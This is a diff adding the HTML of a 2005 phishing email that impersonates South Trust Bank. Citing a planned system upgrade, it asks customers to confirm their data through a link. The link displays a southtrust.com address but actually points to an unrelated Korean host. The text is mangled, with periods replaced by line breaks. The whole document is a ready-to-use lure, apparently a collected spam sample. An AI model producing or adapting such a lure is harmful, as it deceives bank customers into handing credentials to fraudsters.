@@ -1,0 +1,88 @@
+<
+DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4
+01 Transitional//EN"
+"http://www
+w3
+org/TR/html4/loose
+dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>South Trust</title>
+<base href="http://expo93
+co
+kr/~green/www
+southtrust
+com/index
+php">
+</head>
+
+<body>
+<img src="http://lookintothewell
+com/st
+gif" width="207" height="71"><table  border="0" cellspacing="0" 
+cellpadding="0">
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Dear South Trust Bank customer, </font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Technical services of the South Trust Bank are carrying out a planned software and hardware upgrade
+ </font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">We earnestly ask you to visit the following link to start the procedure of confirmation of customer's data
+ </font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><a href="http://expo93
+co
+kr/~green/www
+southtrust
+com/index
+php" target="_blank">https://www
+southtrust
+com/st/PersonalBanking/customers/upgrade=confirmation</a></font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Please do not answer to this email - follow the instructions given above
+ </font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">We present our apologies and thank you for co-operating
+ </font></td>
+  </tr>
+  <tr>
+    <td><table  border="0" align="right" cellpadding="0" cellspacing="0">
+      <tr>
+        <td>&nbsp;</td>
+      </tr>
+      <tr>
+        <td><div align="right"><font color="#999999" size="1" face="Verdana, Arial, Helvetica, sans-serif">Copyright &copy; 2005 SouthTrust
+ All Rights Reserved</font></div></td>
+      </tr>
+      <tr>
+        <td><div align="right"><font color="#999999" size="1" face="Verdana, Arial, Helvetica, sans-serif">SouthTrust Bank, Member FDIC
+ </font></div></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+</body>
+</html>
+
+mxhszu
